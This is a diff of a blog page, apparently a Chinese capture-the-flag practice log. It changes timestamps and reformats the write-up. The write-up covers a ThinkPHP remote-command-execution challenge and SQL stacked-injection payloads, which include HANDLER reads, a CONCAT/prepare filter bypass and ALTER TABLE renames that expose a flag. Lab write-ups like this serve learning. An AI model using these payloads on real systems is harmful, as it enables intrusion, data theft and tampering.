@@ -34,7 +34,7 @@
 <meta property="og:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/5.png">
 <meta property="og:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/6.png">
 <meta property="article:published_time" content="2023-08-19T09:20:34.000Z">
-<meta property="article:modified_time" content="2023-08-19T10:36:54.192Z">
+<meta property="article:modified_time" content="2023-08-19T10:38:52.577Z">
 <meta property="article:author" content="Justin">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/image/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/1.png">
@@ -202,7 +202,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-08-19 17:20:34 / 修改时间：18:36:54" itemprop="dateCreated datePublished" datetime="2023-08-19T17:20:34+08:00">2023-08-19</time>
+      <time title="创建时间：2023-08-19 17:20:34 / 修改时间：18:38:52" itemprop="dateCreated datePublished" datetime="2023-08-19T17:20:34+08:00">2023-08-19</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -238,10 +238,10 @@
 <h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>encode逆向算法为decode<br>substr() 函数返回字符串的一部分。substr(string,start,length)注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。<br>ord() 函数返回字符串中第一个字符的 ASCII 值。<br>chr() 函数从指定 ASCII 值返回字符。并可以指定ASCII是十进制或是十六进制或是八进制。<br>“.” 是字符运算符，作用是把两个字符串连接起来，其使用方法：首先创建一个PHP示例文件；然后定义两个变量；最后通过“$result.$result”方式将两个变量连接起来即可<br>str_rot13() 函数对字符串执行 ROT13 编码。ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。</p>
 <h1 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h1><p>进入后发现时是一个php框架，根据题目远程命令执行，我们在github上搜一下这个版本有什么漏洞，发现有好几个5.0，随便选择一个试一试，发现新提示5.0.2，得漏洞命令；<br>将命令中的id改成‘ls’，发现没什么可疑的，通过..&#x2F;查看上级目录，最终在根目录下查到flag文件，再用find语句：find &#x2F; -name “flag”寻找与flag相关的，得到名为’flag‘，再用cat语句即可得到flag</p>
 <h1 id="supersqli-堆叠注入"><a href="#supersqli-堆叠注入" class="headerlink" title="supersqli(堆叠注入)"></a>supersqli(堆叠注入)</h1><p>正常进行sql注入，发现联合注入时报错，页面显示select等关键词被禁用，于是尝试堆叠注入：</p>
-<h2 id="查看数据库："><a href="#查看数据库：" class="headerlink" title="查看数据库："></a>查看数据库：</h2><p><code>-1&#39;; show databases; #</code><br>发现sqlmap查的数据库中没有的supersqli<br>查表：-1’;use supersqli;show tables;#<br>查字段：-1’;use supersqli;show columns from <code>1919810931114514</code>;#（当纯数字字符串是表名的时候需要加反引号&#96; ）<br>发现了flag的位置</p>
-<h2 id="查询："><a href="#查询：" class="headerlink" title="查询："></a>查询：</h2><h3 id="handler查询法"><a href="#handler查询法" class="headerlink" title="handler查询法"></a>handler查询法</h3><p>从语法上看，HANDLER可以通过指定的索引去访问数据：<br>-1’;use supersqli;handler <code>1919810931114514</code> open as p;handler p read first;#</p>
-<h3 id="预编译绕过法"><a href="#预编译绕过法" class="headerlink" title="预编译绕过法"></a>预编译绕过法</h3><p>-1’;<br>set @sql &#x3D; CONCAT(‘sele’,’ct flag from <code>1919810931114514</code>;’);<br>prepare stmt from @sql;<br>EXECUTE stmt;#<br>发现被strstr函数过滤，strstr函数是过滤函数，但不区分大小写，故利用大小写进行过滤</p>
-<h3 id="修改原查询法"><a href="#修改原查询法" class="headerlink" title="修改原查询法"></a>修改原查询法</h3><p>原理就是没有过滤掉alter，将字段flag改为1，在查询的时候直接出现flag<br>先看看我们一开始查询1的时候那表在哪，这里我们知道原查询默认的数据库就是supersqli，在表words的字段id<br>-1’;<br>alter tables words rename kkk;<br>alter tables 1919810931114514 rename words;<br>alter tables words change flag id varchar(100);#<br>然后在查询1’ or 1#</p>
+<h2 id="查看数据库："><a href="#查看数据库：" class="headerlink" title="查看数据库："></a>查看数据库：</h2><p>“-1’; show databases; #”<br>发现sqlmap查的数据库中没有的supersqli<br>查表：”-1’;use supersqli;show tables;#”<br>查字段：”-1’;use supersqli;show columns from <code>1919810931114514</code>;#”（当纯数字字符串是表名的时候需要加反引号&#96; ）<br>发现了flag的位置</p>
+<h2 id="查询："><a href="#查询：" class="headerlink" title="查询："></a>查询：</h2><h3 id="handler查询法"><a href="#handler查询法" class="headerlink" title="handler查询法"></a>handler查询法</h3><p>从语法上看，HANDLER可以通过指定的索引去访问数据：<br>“-1’;use supersqli;handler <code>1919810931114514</code> open as p;handler p read first;#”</p>
+<h3 id="预编译绕过法"><a href="#预编译绕过法" class="headerlink" title="预编译绕过法"></a>预编译绕过法</h3><p>“-1’;<br>set @sql &#x3D; CONCAT(‘sele’,’ct flag from <code>1919810931114514</code>;’);<br>prepare stmt from @sql;<br>EXECUTE stmt;#”<br>发现被strstr函数过滤，strstr函数是过滤函数，但不区分大小写，故利用大小写进行过滤</p>
+<h3 id="修改原查询法"><a href="#修改原查询法" class="headerlink" title="修改原查询法"></a>修改原查询法</h3><p>原理就是没有过滤掉alter，将字段flag改为1，在查询的时候直接出现flag<br>先看看我们一开始查询1的时候那表在哪，这里我们知道原查询默认的数据库就是supersqli，在表words的字段id<br>“-1’;<br>alter tables words rename kkk;<br>alter tables 1919810931114514 rename words;<br>alter tables words change flag id varchar(100);#”<br>然后在查询”1’ or 1#”</p>
 
     </div>
 
